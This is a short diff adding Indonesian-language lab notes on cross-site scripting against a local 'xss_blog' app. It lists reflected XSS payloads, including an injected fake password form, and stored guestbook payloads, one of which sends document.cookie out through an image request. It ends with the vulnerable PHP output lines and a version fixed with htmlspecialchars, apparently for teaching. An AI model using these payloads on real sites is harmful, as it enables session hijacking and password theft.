@@ -1,0 +1,25 @@
+Inject Reflected XSS :
+http://localhost/xss_blog/search.php?q=web<script>alert("Hacked")</script>
+
+
+http://localhost/xss_blog/search.php?q=web<form action="http:hac" method="post">Masukan Password Anda: <input type="password" name="password"><input type="submit" value="Submit"></form>
+
+Stored XSS (Guestbook):
+halo 
+<script>alert("Hacked")</script>
+
+halo 
+<script>
+new Image().src="http://localhost/xss_blog/guestbook.php?cookie="+document.cookie;
+</script> 
+
+
+- vuln gb.php :
+
+echo "<small>Oleh <b>{$row['nama']}</b> pada {$row['tanggal']}</small>";
+echo "<p>{$row['pesan']}</p>";
+
+- Secure Coding Practice :
+
+echo "<small>Oleh <b>" . htmlspecialchars($row['nama']) . "</b> pada" . htmlspecialchars($row['tanggal']) . "</small>";
+echo "<p>" . htmlspecialchars($row["pesan"]) . "</p>";
